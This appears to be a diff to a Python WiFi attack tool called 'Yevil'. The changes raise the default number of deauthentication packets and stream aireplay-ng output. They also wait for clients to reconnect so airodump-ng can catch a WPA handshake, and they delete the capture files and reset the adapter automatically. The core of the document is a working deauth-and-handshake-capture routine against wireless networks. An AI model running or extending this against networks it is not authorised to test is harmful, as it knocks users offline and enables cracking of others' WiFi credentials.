@@ -1,9 +1,10 @@
 #!/usr/bin/env python3
 """
-Yevil - Real‑time WiFi Scanner v2.4.0
+Yevil - Real‑time WiFi Scanner v2.5.0
 - Curses TUI for live scanning.
 - Persistent AP summary after exit.
 - Select AP for focused scan + deauth attack + handshake detection.
+- Clean deauth output, auto reset.
 """
 
 import os
@@ -259,23 +260,22 @@ def run_targeted_scan(bssid, channel, interface):
     """Launch focused scan + deauth attack, then check for handshake."""
     # Ask for deauth count
     try:
-        count = input("[?] Number of deauth packets to send (default 10): ").strip()
+        count = input("[?] Number of deauth packets to send (default 20): ").strip()
         if count == "":
-            count = "10"
+            count = "20"
         else:
             count = int(count)
             count = str(count)
     except ValueError:
-        count = "10"
-        print("[!] Invalid input, using default 10.")
+        count = "20"
+        print("[!] Invalid input, using default 20.")
 
     # Prepare capture filenames
     cap_prefix = f"/tmp/yevil_handshake_{bssid.replace(':', '_')}"
     cap_file = f"{cap_prefix}-01.cap"
-    csv_file = f"{cap_prefix}-01.csv"
 
     # Remove old files
-    for f in [cap_file, csv_file]:
+    for f in [cap_file]:
         if os.path.exists(f):
             try:
                 os.remove(f)
@@ -293,9 +293,9 @@ def run_targeted_scan(bssid, channel, interface):
     ]
     print(f"\n[+] Starting capture: {' '.join(cmd_airodump)}")
     airo_proc = subprocess.Popen(cmd_airodump, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    time.sleep(2)  # give it a moment to start
+    time.sleep(2)
 
-    # Send deauth packets
+    # Send deauth packets – capture output and print cleanly
     cmd_deauth = [
         'sudo', 'aireplay-ng',
         '-0', count,
@@ -304,12 +304,24 @@ def run_targeted_scan(bssid, channel, interface):
         interface
     ]
     print(f"\n[+] Sending deauth packets: {' '.join(cmd_deauth)}")
-    try:
-        subprocess.run(cmd_deauth)
-    except KeyboardInterrupt:
-        print("\n[!] Deauth interrupted by user.")
-    except Exception as e:
-        print(f"[-] Deauth error: {e}")
+    print("[+] Deauth progress:")
+    
+    # Use Popen to read output line by line and print with a prefix
+    deauth_proc = subprocess.Popen(cmd_deauth,
+                                   stdout=subprocess.PIPE,
+                                   stderr=subprocess.STDOUT,
+                                   text=True,
+                                   bufsize=1)
+    
+    for line in deauth_proc.stdout:
+        line = line.strip()
+        if line:
+            print(f"    {line}")
+    deauth_proc.wait()
+
+    # Wait a few seconds for client reconnection
+    print("[+] Waiting 5 seconds for potential reconnection...")
+    time.sleep(5)
 
     # Stop airodump-ng
     print("[+] Stopping capture...")
@@ -337,15 +349,13 @@ def run_targeted_scan(bssid, channel, interface):
     else:
         print("[-] No capture file found. Something went wrong.")
 
-    # Optionally keep files, or delete
-    keep = input("\n[?] Keep capture files? (y/n): ")
-    if keep.lower() != 'y':
-        for f in [cap_file, csv_file]:
-            try:
-                os.remove(f)
-            except:
-                pass
-        print("[+] Capture files deleted.")
+    # Delete capture files automatically
+    for f in [cap_file]:
+        try:
+            os.remove(f)
+        except:
+            pass
+    print("[+] Capture files cleaned up.")
 
 # ============================================
 # MAIN EXECUTION
@@ -429,10 +439,9 @@ def main():
         except KeyboardInterrupt:
             print("\n[+] Skipped.")
 
-    # Optional reset
-    reset_choice = input("\n[?] Restore adapter to normal managed mode? (y/n): ")
-    if reset_choice.lower() == 'y':
-        reset_adapter()
+    # Auto reset adapter
+    print("\n[+] Restoring adapter to managed mode...")
+    reset_adapter()
 
     print("\n[+] Done. Goodbye!")
 
